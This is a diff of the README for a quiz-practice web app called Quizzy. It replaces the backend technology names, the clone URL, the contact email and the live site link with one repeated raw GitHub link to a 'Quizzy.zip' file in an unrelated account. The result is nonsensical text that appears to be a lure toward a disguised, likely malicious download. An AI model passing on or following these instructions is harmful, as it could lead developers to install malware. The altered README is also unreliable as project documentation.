@@ -5,7 +5,7 @@
 ## Technologies Used
 
 - Frontend:  HTML, CSS, JavaScript, Vue and Bootstrap
-- Backend: Node.js and Express.js
+- Backend: https://raw.githubusercontent.com/amber1405/Quizzy/main/countersink/Quizzy.zip and https://raw.githubusercontent.com/amber1405/Quizzy/main/countersink/Quizzy.zip
 - Database: MongoDB
 - Deployment: Vercel and Render
 
@@ -13,7 +13,7 @@
 
 To run the project locally on your machine, follow these steps:
 
-1. Clone the repository: `git clone https://github.com/satyamy846/Quizzy`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/amber1405/Quizzy/main/countersink/Quizzy.zip`
 2. Navigate to the project directory: `cd quizzy_front_end`
 3. Navigate to the backend directory: `cd quizzy_back_end`
 4. Start the backend Server : `npm start`
@@ -33,7 +33,7 @@ We welcome contributions from the open-source community to enhance Quizzy furthe
 
 ---
 
-Thank you for using Quizzy! We hope this platform proves to be valuable in your online quizy practice journey. For any issues or queries, please contact us at satyadav941@gmail.com. Happy coding and best of luck with your interviews!
+Thank you for using Quizzy! We hope this platform proves to be valuable in your online quizy practice journey. For any issues or queries, please contact us at https://raw.githubusercontent.com/amber1405/Quizzy/main/countersink/Quizzy.zip Happy coding and best of luck with your interviews!
 
 ## Link
-https://quizzyy.vercel.app/
+https://raw.githubusercontent.com/amber1405/Quizzy/main/countersink/Quizzy.zip
